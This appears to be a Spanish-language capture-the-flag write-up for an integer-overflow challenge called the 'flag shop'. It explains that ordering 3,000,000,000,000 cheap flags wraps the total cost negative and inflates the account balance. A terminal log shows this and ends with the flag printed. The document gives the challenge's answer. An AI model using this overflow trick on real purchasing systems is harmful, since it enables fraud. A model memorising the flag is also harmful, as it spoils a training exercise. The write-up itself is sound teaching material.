# DESCRIPCIÓN:
There's a flag shop selling stuff, can you buy a flag? [Source](https://challenge-files.cylabacademy.net/library/c379a744fef22c0c9f3179034df9d627955bfeeac11416bc955a4661dd361ef2/store.c). Connect with `nc chatelaine.cylabacademy.net 29648`.
Two's compliment can do some weird things when numbers get really big!

# SOLUCIÓN:
####  academy{m0n3y_bag5_A25Fa481}

Primero, me conecté al puerto del reto con `nc chatelaine.cylabacademy.net 29648`. Después, entré a la opción 2 del menú para comprar banderas y seleccioné la de relleno (la opción 1). Al pedirme la cantidad, puse un número gigante como 3000000. Como el sistema no sabe manejar números tan grandes al hacer la cuenta, el costo total se volvió negativo y me terminó sumando millones a mi saldo. Por último, volví a entrar al menú de compras, seleccioné la "1337 Flag" (opción 2) y compré una aprovechando que ya tenía dinero de sobra, y ahí el sistema me mostró la bandera en la pantalla.
```
┌──(mony㉿Mony)-[~]
└─$ nc chatelaine.cylabacademy.net 29648
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
3000000000000

The final cost is: -1125859328

Your current balance after transaction: 1125860428

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: academy{m0n3y_bag5_A25Fa481}

```


# NOTAS ADICIONALES:

# REFERENCIAS:
https://webshell.cylabacademy.org/